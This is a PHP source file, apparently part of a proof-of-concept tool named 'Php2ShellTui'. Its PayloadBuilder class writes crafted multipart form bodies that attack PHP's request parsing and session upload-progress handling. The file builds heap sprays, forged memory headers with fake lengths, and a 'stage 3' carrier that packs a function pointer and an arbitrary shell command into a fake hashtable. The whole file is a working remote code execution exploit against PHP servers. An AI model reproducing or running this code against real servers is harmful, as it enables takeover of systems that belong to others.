<?php

declare(strict_types=1);

namespace Php2ShellTui\Poc;

final class PayloadBuilder
{
    private const BOUNDARY = 'CCCCCCCCCC';
    private const A1_PARTS = 860;
    private const A1_DEPTH = 64;
    private const A1_KEY_PAD = 90;
    private const A1_FILLERS = 14;
    private const A1_BURNERS = 20;
    private const A1_BIG_LEN = 8000;
    private const A1_BURNER_LEN = 4000;
    private const A1_PROGRESS_LEN = 4000;
    private const B1_NAME_LEN = 120;

    public function a1(string $path, int $big = 78): void
    {
        if ($big < 0) {
            throw new \InvalidArgumentException('A1 big value count must not be negative.');
        }

        $fh = $this->open($path);

        try {
            $this->part($fh, 'PHPSESSID', hex2bin('00'));

            for ($i = 0; $i < self::A1_PARTS; $i++) {
                $contentType = match (true) {
                    $i === 0 => str_repeat('C', 103),
                    $i === 1 => str_repeat('C', 231),
                    default => 'application/octet-stream',
                };

                $this->part(
                    $fh,
                    $this->nestName($i, self::A1_DEPTH, self::A1_KEY_PAD),
                    '',
                    $i <= 1 ? 'A' : '',
                    $contentType,
                    true,
                );
            }

            for ($i = 0; $i < self::A1_FILLERS; $i++) {
                $this->part($fh, str_pad(sprintf('f%04d', $i), 103, 'x'), str_repeat('v', 8));
            }

            for ($i = 0; $i < $big; $i++) {
                $this->part($fh, sprintf('b%04d', $i), str_repeat('B', self::A1_BIG_LEN));
            }

            for ($i = 0; $i < self::A1_BURNERS; $i++) {
                $this->part($fh, sprintf('u%02d', $i), str_repeat('U', self::A1_BURNER_LEN));
            }

            $this->part($fh, 'PHP_SESSION_UPLOAD_PROGRESS', str_repeat('k', self::A1_PROGRESS_LEN));
            $this->write($fh, '--' . self::BOUNDARY . "--\r\n");
        } finally {
            fclose($fh);
        }
    }

    public function b1(string $path, int $fakeLen = 0xC8000, bool $tag = true, ?string $spec = null): void
    {
        if ($fakeLen < 1) {
            throw new \InvalidArgumentException('B1 fake length must be positive.');
        }

        $spec ??= implode(',', array_merge(
            array_fill(0, 14, 'G:511:0x137'),
            ['G:400:0x137', 'G:511:0x137', 'X:900'],
        ));

        $fh = $this->open($path);

        try {
            $this->part($fh, 'PHPSESSID', 'a');
            $this->part($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'k0');

            $idx = 0;
            foreach (preg_split('/[\s,]+/', trim($spec)) ?: [] as $item) {
                if ($item === '') {
                    continue;
                }

                [$kind, $arg] = array_pad(explode(':', $item, 2), 2, '');

                if ($kind === 'G') {
                    [$pages, $page] = array_pad(explode(':', $arg, 2), 2, '');
                    $value = $this->forgeFillValue(
                        (int) intval($pages, 0),
                        (int) intval($page, 0),
                        $fakeLen,
                        $idx,
                        $tag,
                    );
                    $name = substr(str_pad(sprintf('f%04d', $idx), self::B1_NAME_LEN, 'f'), 0, self::B1_NAME_LEN);
                    $this->part($fh, $name, $value);
                    $idx++;
                    continue;
                }

                if ($kind === 'X') {
                    $count = (int) intval($arg, 0);
                    for ($j = 0; $j < $count; $j++) {
                        $this->part($fh, sprintf('x%05d', $idx) . str_repeat('[a]', 12), 'v');
                        $idx++;
                    }
                    continue;
                }

                throw new \InvalidArgumentException(sprintf('Unknown B1 spec item "%s".', $item));
            }

            $this->write($fh, '--' . self::BOUNDARY . "--\r\n");
        } finally {
            fclose($fh);
        }
    }

    public function a2(string $path, int $parts = 880, int $depth = 64, int $fillers = 115): void
    {
        if ($parts < 0 || $depth < 2 || $fillers < 0) {
            throw new \InvalidArgumentException('A2 parts, depth, or fillers are invalid.');
        }

        $fh = $this->open($path);

        try {
            $this->part($fh, 'PHPSESSID', str_repeat('a', 32));
            $this->part($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'k0');

            for ($i = 0; $i < $fillers; $i++) {
                $this->part($fh, sprintf('%03d', $i), 'x');
            }

            for ($i = 0; $i < $parts; $i++) {
                $this->part(
                    $fh,
                    sprintf('files[R%05d]', $i) . str_repeat('[a]', $depth - 2),
                    '',
                    '',
                    'application/octet-stream',
                    true,
                );
            }

            $this->write($fh, '--' . self::BOUNDARY . "--\r\n");
        } finally {
            fclose($fh);
        }
    }

    public function stage3Carrier(int $sAddr, int $zifAddr, string $command, int $size = 384): string
    {
        if ($size < 0x160) {
            throw new \InvalidArgumentException('The stage-3 carrier must be at least 0x160 bytes.');
        }

        if (strlen($command) > 0x160 - 0x98) {
            throw new \InvalidArgumentException('The stage-3 command is too long for the carrier.');
        }

        $ht = str_repeat("\0", $size);

        $this->put($ht, 0x00, pack('V', 1) . pack('V', 7));
        $this->put($ht, 0x08, pack('V', 0x10) . pack('V', 0xFFFFFFF8));
        $this->put($ht, 0x10, pack('P', $sAddr + 0x20));
        $this->put($ht, 0x18, pack('V', 1) . pack('V', 1));
        $this->put($ht, 0x20, pack('V', 8) . pack('V', 0));
        $this->put($ht, 0x28, pack('P', 0));
        $this->put($ht, 0x30, pack('P', $zifAddr));

        $e = 0x20;
        $this->put($ht, $e + 0x00, pack('P', 0));
        $this->put($ht, $e + 0x08, pack('P', 0));
        $this->put($ht, $e + 0x10, pack('P', $zifAddr));
        $this->put($ht, $e + 0x18, pack('P', 0));
        $this->put($ht, $e + 0x20, pack('P', 0));
        $this->put($ht, $e + 0x28, pack('V', 0));
        $this->put($ht, $e + 0x2C, pack('V', 1));
        $this->put($ht, $e + 0x30, pack('P', 0));
        $this->put($ht, $e + 0x38, pack('P', 0));
        $this->put($ht, $e + 0x40, pack('V', 0));
        $this->put($ht, $e + 0x50, pack('P', $sAddr + 0x80));
        $this->put($ht, $e + 0x58, pack('V', 6));

        $this->put($ht, 0x80, pack('V', 1) . pack('V', 0x106));
        $this->put($ht, 0x88, pack('P', 0));
        $this->put($ht, 0x90, pack('P', strlen($command)));
        $this->put($ht, 0x98, $command);
        $this->put($ht, 0x98 + strlen($command), "\0");

        return $ht;
    }

    public function b2(
        string $path,
        string $ht,
        int $sAddr,
        int $vl = 384,
        int $n1 = 500,
        int $n2 = 495,
    ): void {
        if ($vl < 32 || $n1 < 0 || $n2 < 0 || $ht === '') {
            throw new \InvalidArgumentException('B2 parameters are invalid.');
        }

        $spray = str_repeat('S', $vl);
        for ($offset = 8; $offset + 32 <= $vl; $offset += 32) {
            $spray = substr_replace($spray, $this->fakeRef($sAddr, 1, 0x0107), $offset, 32);
        }

        $fh = $this->open($path);

        try {
            for ($i = 0; $i < $n1; $i++) {
                $this->part($fh, $this->makeName('s', $i, 10), $spray);
            }

            $this->part($fh, 'ht', $ht);
            $this->part($fh, 'PHPSESSID', str_repeat('a', 32));
            $this->part($fh, 'PHP_SESSION_UPLOAD_PROGRESS', 'k0');

            for ($i = 0; $i < $n2; $i++) {
                $this->part($fh, $this->makeName('t', $i, 10), $spray);
            }

            $this->write($fh, '--' . self::BOUNDARY . "--\r\n");
        } finally {
            fclose($fh);
        }
    }

    private function fakeRef(int $ptr, int $rc, int $valType): string
    {
        $ref = str_repeat("\0", 32);
        $ref = substr_replace($ref, pack('V', $rc), 0, 4);
        $ref[4] = "\x0A";
        $ref = substr_replace($ref, pack('P', $ptr), 8, 8);
        $ref = substr_replace($ref, pack('V', $valType), 16, 4);

        return $ref;
    }

    private function makeName(string $prefix, int $i, int $length): string
    {
        $name = $prefix . sprintf('%09d', $i);

        return substr(str_pad($name, $length, 'x'), 0, $length);
    }

    private function put(string &$buffer, int $offset, string $bytes): void
    {
        $buffer = substr_replace($buffer, $bytes, $offset, strlen($bytes));
    }

    private function forgeFillValue(int $pages, int $page, int $fakeLen, int $idx, bool $tagged): string
    {
        $length = $pages * 4096 - 25;
        if ($length < 1) {
            throw new \InvalidArgumentException('B1 page count is too small.');
        }

        $value = str_repeat('A', $length);
        $header = $page * 0x1000 - 0x1018;

        if ($header >= 0 && $header + 0x18 + 8 <= $length) {
            $value = substr_replace($value, pack('V', 0), $header, 4);
            $value = substr_replace($value, pack('V', 0x16), $header + 4, 4);
            $value = substr_replace($value, pack('P', 0), $header + 8, 8);
            $value = substr_replace($value, pack('P', $fakeLen), $header + 0x10, 8);
            $value = substr_replace($value, $this->tag8($idx, $tagged), $header + 0x18, 8);
        }

        return $value;
    }

    private function tag8(int $idx, bool $tagged): string
    {
        return $tagged
            ? '/' . sprintf('%02d', $idx % 100) . 'BBBBB'
            : 'BBBB/BBB';
    }

    private function nestName(int $i, int $depth, int $keyPad): string
    {
        if ($depth < 2) {
            throw new \InvalidArgumentException('A1 nesting depth must be at least 2.');
        }

        return sprintf('files[R%05d%s]', $i, str_repeat('K', $keyPad)) . str_repeat('[a]', $depth - 2);
    }

    /**
     * @param resource $fh
     */
    private function part(
        mixed $fh,
        string $name,
        string $value = '',
        ?string $filename = null,
        ?string $contentType = null,
        bool $emptyFile = false,
    ): void {
        $this->write($fh, '--' . self::BOUNDARY . "\r\nContent-Disposition: form-data; name=\"" . $name . '"');

        if ($filename !== null) {
            $this->write($fh, '; filename="' . $filename . '"');
        }

        $this->write($fh, "\r\n");

        if ($contentType !== null) {
            $this->write($fh, 'Content-Type: ' . $contentType . "\r\n");
        }

        $this->write($fh, "\r\n");

        if (!$emptyFile) {
            $this->write($fh, $value . "\r\n");
        }
    }

    /**
     * @return resource
     */
    private function open(string $path): mixed
    {
        $fh = @fopen($path, 'wb');
        if ($fh === false) {
            throw new \RuntimeException(sprintf('Cannot write the payload file "%s".', $path));
        }

        return $fh;
    }

    /**
     * @param resource $fh
     */
    private function write(mixed $fh, string $data): void
    {
        $length = strlen($data);
        $offset = 0;

        while ($offset < $length) {
            $written = fwrite($fh, substr($data, $offset));

            if ($written === false || $written === 0) {
                throw new \RuntimeException('Cannot write the payload file.');
            }

            $offset += $written;
        }
    }
}
